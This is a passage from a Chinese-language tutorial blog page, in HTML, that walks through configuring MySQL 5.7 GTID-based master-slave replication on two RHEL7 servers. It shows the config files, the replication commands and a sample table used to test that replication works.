href="#GTID&#x6BD4;&#x4F20;&#x7EDF;&#x590D;&#x5236;&#x7684;&#x4F18;&#x52BF;" class="headerlink" title="GTID&#x6BD4;&#x4F20;&#x7EDF;&#x590D;&#x5236;&#x7684;&#x4F18;&#x52BF;"></a>GTID&#x6BD4;&#x4F20;&#x7EDF;&#x590D;&#x5236;&#x7684;&#x4F18;&#x52BF;</h2><ul><li>&#x66F4;&#x7B80;&#x5355;&#x7684;&#x5B9E;&#x73B0;failover&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x627E;log_file&#x548C;log_Pos  </li><li>&#x66F4;&#x7B80;&#x5355;&#x7684;&#x642D;&#x5EFA;&#x4E3B;&#x4ECE;&#x590D;&#x5236;</li><li>&#x6BD4;&#x4F20;&#x7EDF;&#x590D;&#x5236;&#x66F4;&#x52A0;&#x5B89;&#x5168;</li><li>GTID&#x662F;&#x8FDE;&#x7EED;&#x6CA1;&#x6709;&#x7A7A;&#x6D1E;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x4E3B;&#x4ECE;&#x5E93;&#x51FA;&#x73B0;&#x6570;&#x636E;&#x51B2;&#x7A81;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x6DFB;&#x52A0;&#x7A7A;&#x4E8B;&#x7269;&#x7684;&#x65B9;&#x5F0F;&#x8FDB;&#x884C;&#x8DF3;&#x8FC7;</li></ul><h2 id="&#x914D;&#x7F6E;&#x4E00;&#x4E3B;&#x4E00;&#x4ECE;GTID"><a href="#&#x914D;&#x7F6E;&#x4E00;&#x4E3B;&#x4E00;&#x4ECE;GTID" class="headerlink" title="&#x914D;&#x7F6E;&#x4E00;&#x4E3B;&#x4E00;&#x4ECE;GTID"></a>&#x914D;&#x7F6E;&#x4E00;&#x4E3B;&#x4E00;&#x4ECE;GTID</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x6570;&#x636E;&#x5E93;&#x89D2;&#x8272;           IP         &#x7CFB;&#x7EDF;&#x4E0E;MySQL&#x7248;&#x672C;         &#x6709;&#x65E0;&#x6570;&#x636E;</span><br><span class="line">&#x4E3B;&#x6570;&#x636E;&#x5E93;    192.168.10.11    RHEL7 MySQL5.7        &#x65E0;&#x6570;&#x636E;</span><br><span class="line">&#x4ECE;&#x6570;&#x636E;&#x5E93;    192.168.10.12    RHEL7 MySQL5.7        &#x65E0;&#x6570;&#x636E;</span><br></pre></td></tr></tbody></table></figure><p>&#x5728;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540C;&#x6B65;&#x8D26;&#x6237;&#x6388;&#x6743;&#x7ED9;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x4F7F;&#x7528;</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@server11 ~]# mysql -uroot -pJaking@vip.163.com</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 5</span><br><span class="line">Server version: 5.7.24 MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; grant replication slave on *.* to &apos;Jaking&apos;@&apos;192.168.10.%&apos; identified by &apos;Jaking@vip.163.com&apos;;</span><br><span class="line">Query OK, 0 rows affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; exit</span><br><span class="line">Bye</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x914D;&#x7F6E;&#x4E3B;&#x5E93;&#x6587;&#x4EF6;</strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[root@server11 ~]# vim /etc/my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">port=3306</span><br><span class="line">datadir=/var/lib/mysql</span><br><span class="line">socket=/var/lib/mysql/mysql.sock</span><br><span class="line">skip-name-resolve</span><br><span class="line">symbolic-links=0</span><br><span class="line"></span><br><span class="line">log-error=/var/log/mysqld.log</span><br><span class="line">pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line">skip-name-resolve</span><br><span class="line"></span><br><span class="line">log-bin=mysql-bin                        // &#x5F00;&#x542F;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;</span><br><span class="line">server-id=11                             // &#x670D;&#x52A1;&#x5668;ID&#xFF0C;&#x5FC5;&#x987B;&#x552F;&#x4E00;</span><br><span class="line">gtid-mode=on                             #&#x5F00;&#x542F;gtid&#x6A21;&#x5F0F;</span><br><span class="line">enforce-gtid-consistency=on       //&#x5F3A;&#x5236;gtid&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x5F00;&#x542F;&#x540E;&#x5BF9;&#x7279;&#x5B9A;&#x7684;create table&#x4E0D;&#x652F;&#x6301;</span><br><span class="line">binlog-format=row                       //&#x9ED8;&#x8BA4;&#x4E3A;mixed&#x6DF7;&#x5408;&#x6A21;&#x5F0F;&#xFF0C;&#x66F4;&#x6539;&#x6210;row&#x590D;&#x5236;&#xFF0C;&#x4E3A;&#x4E86;&#x6570;&#x636E;&#x4E00;&#x81F4;&#x6027;</span><br><span class="line">log-slave-updates=1                    //&#x4ECE;&#x5E93;binlog&#x8BB0;&#x5F55;&#x4E3B;&#x5E93;&#x540C;&#x6B65;&#x7684;&#x64CD;&#x4F5C;&#x65E5;&#x5FD7;</span><br><span class="line">skip-slave-start=1                         //&#x8DF3;&#x8FC7;slave&#x590D;&#x5236;&#x7EBF;&#x7A0B;</span><br></pre></td></tr></tbody></table></figure><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@server11 ~]# systemctl restart mysqld</span><br><span class="line">[root@server11 ~]# systemctl status mysqld </span><br><span class="line">&#x25CF; mysqld.service - MySQL Server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/mysqld.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Fri 2022-04-22 05:28:12 EDT; 6s ago</span><br><span class="line">     Docs: man:mysqld(8)</span><br><span class="line">           http://dev.mysql.com/doc/refman/en/using-systemd.html</span><br><span class="line">  Process: 11752 ExecStart=/usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid $MYSQLD_OPTS (code=exited, status=0/SUCCESS)</span><br><span class="line">  Process: 11730 ExecStartPre=/usr/bin/mysqld_pre_systemd (code=exited, status=0/SUCCESS)</span><br><span class="line"> Main PID: 11755 (mysqld)</span><br><span class="line">    Tasks: 27</span><br><span class="line">   CGroup: /system.slice/mysqld.service</span><br><span class="line">           &#x2514;&#x2500;11755 /usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld...</span><br><span class="line"></span><br><span class="line">Apr 22 05:28:11 server11 systemd[1]: Stopped MySQL Server.</span><br><span class="line">Apr 22 05:28:11 server11 systemd[1]: Starting MySQL Server...</span><br><span class="line">Apr 22 05:28:12 server11 systemd[1]: Started MySQL Server.</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x67E5;&#x770B;GTID&#x6A21;&#x5F0F;&#x72B6;&#x6001;</strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@server11 ~]# mysql -uroot -pJaking@vip.163.com -e &apos;show variables like &quot;%GTID%&quot;;&apos;</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">+----------------------------------+-----------+</span><br><span class="line">| Variable_name                    | Value     |</span><br><span class="line">+----------------------------------+-----------+</span><br><span class="line">| binlog_gtid_simple_recovery      | ON        |</span><br><span class="line">| enforce_gtid_consistency         | ON        |</span><br><span class="line">| gtid_executed_compression_period | 1000      |</span><br><span class="line">| gtid_mode                        | ON        |</span><br><span class="line">| gtid_next                        | AUTOMATIC |</span><br><span class="line">| gtid_owned                       |           |</span><br><span class="line">| gtid_purged                      |           |</span><br><span class="line">| session_track_gtids              | OFF       |</span><br><span class="line">+----------------------------------+-----------+</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x914D;&#x7F6E;&#x4ECE;&#x5E93;&#x6587;&#x4EF6;</strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">[root@server12 ~]# vim /etc/my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">port=3306</span><br><span class="line">datadir=/var/lib/mysql</span><br><span class="line">socket=/var/lib/mysql/mysql.sock</span><br><span class="line">symbolic-links=0</span><br><span class="line"></span><br><span class="line">log-error=/var/log/mysqld.log</span><br><span class="line">pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line">skip-name-resolve</span><br><span class="line"></span><br><span class="line">log-bin=mysql-bin</span><br><span class="line">server-id=12</span><br><span class="line">gtid-mode=on  </span><br><span class="line">enforce-gtid-consistency=on          </span><br><span class="line">binlog-format=row</span><br><span class="line">log-slave-updates=1</span><br><span class="line">skip-slave-start=1</span><br><span class="line">[root@server12 ~]# systemctl restart mysqld</span><br><span class="line">[root@server12 ~]# systemctl status mysqld </span><br><span class="line">&#x25CF; mysqld.service - MySQL Server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/mysqld.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Fri 2022-04-22 18:08:39 CST; 8s ago</span><br><span class="line">     Docs: man:mysqld(8)</span><br><span class="line">           http://dev.mysql.com/doc/refman/en/using-systemd.html</span><br><span class="line">  Process: 2749 ExecStart=/usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid $MYSQLD_OPTS (code=exited, status=0/SUCCESS)</span><br><span class="line">  Process: 2731 ExecStartPre=/usr/bin/mysqld_pre_systemd (code=exited, status=0/SUCCESS)</span><br><span class="line"> Main PID: 2753 (mysqld)</span><br><span class="line">   CGroup: /system.slice/mysqld.service</span><br><span class="line">           &#x2514;&#x2500;2753 /usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/...</span><br><span class="line"></span><br><span class="line">Apr 22 18:08:38 server12 systemd[1]: Starting MySQL Server...</span><br><span class="line">Apr 22 18:08:39 server12 systemd[1]: Started MySQL Server.</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x67E5;&#x770B;GTID&#x6A21;&#x5F0F;&#x72B6;&#x6001;</strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@server12 ~]# mysql -uroot -pJaking@vip.163.com -e &apos;show variables like &quot;%GTID%&quot;;&apos;</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">+----------------------------------+-----------+</span><br><span class="line">| Variable_name                    | Value     |</span><br><span class="line">+----------------------------------+-----------+</span><br><span class="line">| binlog_gtid_simple_recovery      | ON        |</span><br><span class="line">| enforce_gtid_consistency         | ON        |</span><br><span class="line">| gtid_executed_compression_period | 1000      |</span><br><span class="line">| gtid_mode                        | ON        |</span><br><span class="line">| gtid_next                        | AUTOMATIC |</span><br><span class="line">| gtid_owned                       |           |</span><br><span class="line">| gtid_purged                      |           |</span><br><span class="line">| session_track_gtids              | OFF       |</span><br><span class="line">+----------------------------------+-----------+</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x5F00;&#x542F;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;</strong></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">[root@server12 ~]<span class="comment"># mysql -uroot -pJaking@vip.163.com</span></span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.  Commands <span class="keyword">end</span> <span class="keyword">with</span> ; or \g.</span><br><span class="line">Your MySQL connection id is 3</span><br><span class="line">Server version: 5.7.24-log MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &apos;<span class="keyword">help</span>;&apos; or &apos;\h&apos; for help. <span class="keyword">Type</span> <span class="string">&apos;\c&apos;</span> <span class="keyword">to</span> <span class="keyword">clear</span> the <span class="keyword">current</span> <span class="keyword">input</span> statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">change</span> <span class="keyword">master</span> <span class="keyword">to</span></span><br><span class="line">     master_host=<span class="string">&apos;192.168.10.11&apos;</span>,</span><br><span class="line">     master_user=<span class="string">&apos;Jaking&apos;</span>,</span><br><span class="line">     master_password=<span class="string">&apos;Jaking@vip.163.com&apos;</span>,</span><br><span class="line">     master_auto_position=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected, 2 warnings (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; start slave;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show slave status\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">               Slave_IO_State: Waiting for master to send event</span><br><span class="line">                  Master_Host: 192.168.10.11</span><br><span class="line">                  Master_User: Jaking</span><br><span class="line">                  Master_Port: 3306</span><br><span class="line">                Connect_Retry: 60</span><br><span class="line">              Master_Log_File: mysql-bin.000002</span><br><span class="line">          Read_Master_Log_Pos: 154</span><br><span class="line">               Relay_Log_File: server12-relay-bin.000002</span><br><span class="line">                Relay_Log_Pos: 367</span><br><span class="line">        Relay_Master_Log_File: mysql-bin.000002</span><br><span class="line">             Slave_IO_Running: Yes</span><br><span class="line">            Slave_SQL_Running: Yes</span><br><span class="line">              Replicate_Do_DB: </span><br><span class="line">          Replicate_Ignore_DB: </span><br><span class="line">           Replicate_Do_Table: </span><br><span class="line">       Replicate_Ignore_Table: </span><br><span class="line">      Replicate_Wild_Do_Table: </span><br><span class="line">  Replicate_Wild_Ignore_Table: </span><br><span class="line">                   Last_Errno: 0</span><br><span class="line">                   Last_Error: </span><br><span class="line">                 Skip_Counter: 0</span><br><span class="line">          Exec_Master_Log_Pos: 154</span><br><span class="line">              Relay_Log_Space: 577</span><br><span class="line">              Until_Condition: None</span><br><span class="line">               Until_Log_File: </span><br><span class="line">                Until_Log_Pos: 0</span><br><span class="line">           Master_SSL_Allowed: No</span><br><span class="line">           Master_SSL_CA_File: </span><br><span class="line">           Master_SSL_CA_Path: </span><br><span class="line">              Master_SSL_Cert: </span><br><span class="line">            Master_SSL_Cipher: </span><br><span class="line">               Master_SSL_Key: </span><br><span class="line">        Seconds_Behind_Master: 0</span><br><span class="line">Master_SSL_Verify_Server_Cert: No</span><br><span class="line">                Last_IO_Errno: 0</span><br><span class="line">                Last_IO_Error: </span><br><span class="line">               Last_SQL_Errno: 0</span><br><span class="line">               Last_SQL_Error: </span><br><span class="line">  Replicate_Ignore_Server_Ids: </span><br><span class="line">             Master_Server_Id: 11</span><br><span class="line">                  Master_UUID: 03a1eb63-c21a-11ec-b07f-000c2987bea6</span><br><span class="line">             Master_Info_File: /var/lib/mysql/master.info</span><br><span class="line">                    SQL_Delay: 0</span><br><span class="line">          SQL_Remaining_Delay: NULL</span><br><span class="line">      Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates</span><br><span class="line">           Master_Retry_Count: 86400</span><br><span class="line">                  Master_Bind: </span><br><span class="line">      Last_IO_Error_Timestamp: </span><br><span class="line">     Last_SQL_Error_Timestamp: </span><br><span class="line">               Master_SSL_Crl: </span><br><span class="line">           Master_SSL_Crlpath: </span><br><span class="line">           Retrieved_Gtid_Set: </span><br><span class="line">            Executed_Gtid_Set: </span><br><span class="line">                Auto_Position: 1</span><br><span class="line">         Replicate_Rewrite_DB: </span><br><span class="line">                 Channel_Name: </span><br><span class="line">           Master_TLS_Version: </span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><p>&#x67E5;&#x770B;&#x4E3B;&#x4ECE;&#x5E93;&#x7684;&#x4FE1;&#x606F;&#x662F;&#x5426;&#x540C;&#x6B65;</p><p>&#x67E5;&#x770B;&#x4E3B;&#x5E93;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@server11 ~]<span class="comment"># mysql -uroot -pJaking@vip.163.com</span></span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.  Commands <span class="keyword">end</span> <span class="keyword">with</span> ; or \g.</span><br><span class="line">Your MySQL connection id is 5</span><br><span class="line">Server version: 5.7.24-log MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &apos;<span class="keyword">help</span>;&apos; or &apos;\h&apos; for help. <span class="keyword">Type</span> <span class="string">&apos;\c&apos;</span> <span class="keyword">to</span> <span class="keyword">clear</span> the <span class="keyword">current</span> <span class="keyword">input</span> statement.</span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><p>&#x67E5;&#x770B;&#x4ECE;&#x5E93;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[root@server12 ~]<span class="comment"># mysql -uroot -pJaking@vip.163.com</span></span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.  Commands <span class="keyword">end</span> <span class="keyword">with</span> ; or \g.</span><br><span class="line">Your MySQL connection id is 6</span><br><span class="line">Server version: 5.7.24-log MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &apos;<span class="keyword">help</span>;&apos; or &apos;\h&apos; for help. <span class="keyword">Type</span> <span class="string">&apos;\c&apos;</span> <span class="keyword">to</span> <span class="keyword">clear</span> the <span class="keyword">current</span> <span class="keyword">input</span> statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><h2 id="&#x6D4B;&#x8BD5;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;"><a href="#&#x6D4B;&#x8BD5;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;" class="headerlink" title="&#x6D4B;&#x8BD5;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;"></a>&#x6D4B;&#x8BD5;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;</h2><p>&#x5728;&#x4E3B;&#x5E93;&#x6267;&#x884C;&#x4EE5;&#x4E0B;SQL&#x8BED;&#x53E5;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> BOOK;</span><br><span class="line"><span class="keyword">USE</span> BOOK;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> book (<span class="keyword">name</span> <span class="built_in">char</span>(<span class="number">66</span>),price <span class="built_in">int</span>,pages <span class="built_in">int</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book(<span class="keyword">name</span>,price,pages) <span class="keyword">VALUES</span>(<span class="string">&apos;Linux&apos;</span>,<span class="string">&apos;30&apos;</span>,<span class="string">&apos;666&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book(<span class="keyword">name</span>,price,pages) <span class="keyword">VALUES</span>(<span class="string">&apos;Cloud Computing&apos;</span>,<span class="string">&apos;60&apos;</span>,<span class="string">&apos;666&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book(<span class="keyword">name</span>,price,pages) <span class="keyword">VALUES</span>(<span class="string">&apos;Operation System&apos;</span>,<span class="string">&apos;80&apos;</span>,<span class="string">&apos;666&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book(<span class="keyword">name</span>,price,pages) <span class="keyword">VALUES</span>(<span class="string">&apos;Artificial Intelligence&apos;</span>,<span class="string">&apos;166&apos;</span>,<span class="string">&apos;666&apos;</span>);</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> book;</span><br><span class="line"><span class="comment">------------------------------------------------------------------------------------</span></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| BOOK               |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">5 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> BOOK.book;</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">| name                    | price | pages |</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">| Linux                   |    30 |   666 |</span><br><span class="line">| Cloud Computing         |    60 |   666 |</span><br><span class="line">| Operation System        |    80 |   666 |</span><br><span class="line">| Artificial Intelligence |   166 |   666 |</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> 